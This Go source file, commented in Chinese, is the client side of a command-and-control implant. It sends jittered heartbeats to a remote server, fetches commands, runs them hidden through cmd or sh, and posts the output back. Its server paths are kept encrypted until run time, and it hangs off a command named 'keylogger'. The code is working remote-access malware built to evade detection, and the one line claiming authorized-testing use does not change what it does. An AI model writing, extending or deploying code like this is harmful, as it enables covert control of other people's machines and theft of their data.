package cmd

// 心跳与任务轮询:客户端定期向 C2 服务端发送心跳(存活检测),
// 同时拉取服务端下发的命令任务,在本机执行后回传结果。
// 仅用于经授权的测试环境。

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"sync"
	"time"

	"golin/c2config"
	"golin/c2secret"
)

// C2 任务/心跳相关路径(密态存储,运行时解密),与 c2config 包保持一致,
// 一致性由 TestC2ConstsMatch 守护
var (
	c2Health = c2secret.HealthPath()
	c2Tasks  = c2secret.TasksPath()
	c2Result = c2secret.ResultPath()
)

// heartbeatInterval 心跳/拉取任务的间隔(秒)
var heartbeatInterval int

func init() {
	keylogger.Flags().IntVar(&heartbeatInterval, "heartbeat", 15, "心跳/拉取任务间隔(秒)")
}

const (
	taskMaxOutput = 64 * 1024 // 回传输出的最大字节数
)

// taskTimeout 单条命令最长执行时间(变量以便测试缩短)
var taskTimeout = 60 * time.Second

// c2HTTP 复用的 HTTP 客户端:避免每次请求新建连接(减少 TLS 握手与
// TIME_WAIT 端口堆积,行为特征也更平滑)
var c2HTTP = &http.Client{Timeout: 10 * time.Second}

// beaconLoop 心跳 + 任务轮询主循环,随进程运行,stopCh 关闭时退出。
// 轮询间隔带 ±25% 随机抖动,降低固定周期 beacon 的行为特征
func beaconLoop() {
	if heartbeatInterval <= 0 {
		heartbeatInterval = 15
	}
	base := time.Duration(heartbeatInterval) * time.Second
	postHeartbeat()
	runTasks()
	timer := time.NewTimer(jitterInterval(base))
	defer timer.Stop()
	for {
		select {
		case <-timer.C:
			postHeartbeat()
			runTasks()
			timer.Reset(jitterInterval(base))
		case <-stopCh:
			return
		}
	}
}

// jitterInterval 在基础间隔上施加 ±25% 随机抖动
func jitterInterval(base time.Duration) time.Duration {
	f := 0.75 + rand.Float64()*0.5
	return time.Duration(float64(base) * f)
}

// postHeartbeat 发送心跳,刷新服务端在线状态
func postHeartbeat() {
	data, err := json.Marshal(c2config.Heartbeat{ClientID: clientID})
	if err != nil {
		return
	}
	req, err := http.NewRequest("POST", serverURL+c2Health, bytes.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(c2Header, c2Token)
	resp, err := c2HTTP.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

// fetchTasks 从服务端拉取待执行任务,失败返回 nil
func fetchTasks() []c2config.Task {
	req, err := http.NewRequest("GET", serverURL+c2Tasks+"?client="+url.QueryEscape(clientID), nil)
	if err != nil {
		return nil
	}
	req.Header.Set(c2Header, c2Token)
	resp, err := c2HTTP.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	var tasks []c2config.Task
	if err := json.NewDecoder(io.LimitReader(resp.Body, 1<<20)).Decode(&tasks); err != nil {
		return nil
	}
	return tasks
}

// taskMu 防止心跳 tick 重叠导致同一批任务被并发执行
var taskMu sync.Mutex

// runTasks 拉取并顺序执行服务端下发的任务,逐条回传结果
func runTasks() {
	if !taskMu.TryLock() {
		return // 上一批尚未执行完,跳过本轮
	}
	defer taskMu.Unlock()
	tasks := fetchTasks()
	for _, t := range tasks {
		if t.ID == "" || t.Command == "" {
			continue
		}
		out, err := execCommand(t.Command)
		res := c2config.TaskResult{ID: t.ID, ClientID: clientID, Output: out}
		if err != nil {
			res.Error = err.Error()
		}
		postResult(res)
	}
}

// execCommand 执行一条命令并返回输出;Windows 用 cmd /c,其余平台用 sh -c
func execCommand(cmdline string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), taskTimeout)
	defer cancel()
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(ctx, "cmd", "/c", cmdline)
	} else {
		c = exec.CommandContext(ctx, "sh", "-c", cmdline)
	}
	hideConsole(c) // GUI 子系统程序拉起 cmd 默认会闪出控制台窗口,需隐藏
	// 超时杀掉 shell 后,其派生的子进程可能仍持有输出管道(如 ping 由 cmd 派生),
	// WaitDelay 保证 Run 在限定时间内返回,而不是无限等待管道关闭
	c.WaitDelay = 2 * time.Second
	var buf limitedBuffer
	c.Stdout = &buf
	c.Stderr = &buf
	err := c.Run()
	// Windows 控制台输出为 OEM 代码页(中文系统 GBK),需转 UTF-8 再回传,
	// 否则服务端中文回显乱码(见 decode_windows.go)
	out := decodeCmdOutput(buf.Bytes())
	if buf.truncated {
		out += "\n...[输出超长已截断]"
	}
	return out, err
}

// limitedBuffer 限制输出大小的缓冲,超限后继续消费但不再存储
type limitedBuffer struct {
	b         bytes.Buffer
	truncated bool
}

func (l *limitedBuffer) Write(p []byte) (int, error) {
	if l.b.Len() >= taskMaxOutput {
		l.truncated = true
		return len(p), nil
	}
	room := taskMaxOutput - l.b.Len()
	if len(p) > room {
		l.b.Write(p[:room])
		l.truncated = true
		return len(p), nil
	}
	return l.b.Write(p)
}

func (l *limitedBuffer) String() string { return l.b.String() }

// Bytes 返回已缓冲的原始字节(供编码转换使用)
func (l *limitedBuffer) Bytes() []byte { return l.b.Bytes() }

// postResult 回传任务执行结果
func postResult(res c2config.TaskResult) {
	data, err := json.Marshal(res)
	if err != nil {
		return
	}
	req, err := http.NewRequest("POST", serverURL+c2Result, bytes.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(c2Header, c2Token)
	resp, err := c2HTTP.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}
